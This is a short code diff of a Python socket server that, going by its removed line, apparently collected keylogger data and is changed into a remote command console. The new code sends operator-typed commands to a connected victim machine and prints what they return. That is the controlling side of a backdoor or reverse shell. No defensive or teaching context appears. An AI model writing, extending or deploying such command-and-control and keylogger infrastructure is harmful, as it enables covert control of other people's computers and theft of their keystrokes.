@@ -1,6 +1,6 @@
 import socket
 
-def start_server(host='0.0.0.0', port=PORT):
+def start_server(host='0.0.0.0', port=9999):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
     server.listen(1)
@@ -10,10 +10,13 @@ def start_server(host='0.0.0.0', port=PORT):
     print(f"Connection established with {addr}")
 
     while True:
-        data = conn.recv(1024).decode('utf-8')
-        if not data:
+        command = input("Enter command to execute: ")
+        if command.lower() == 'exit':
+            conn.send(command.encode())
             break
-        print(f"Keylogger data received: {data}")
+        conn.send(command.encode())
+        output = conn.recv(4096).decode('utf-8')
+        print(f"Output: {output}")
 
     conn.close()
 
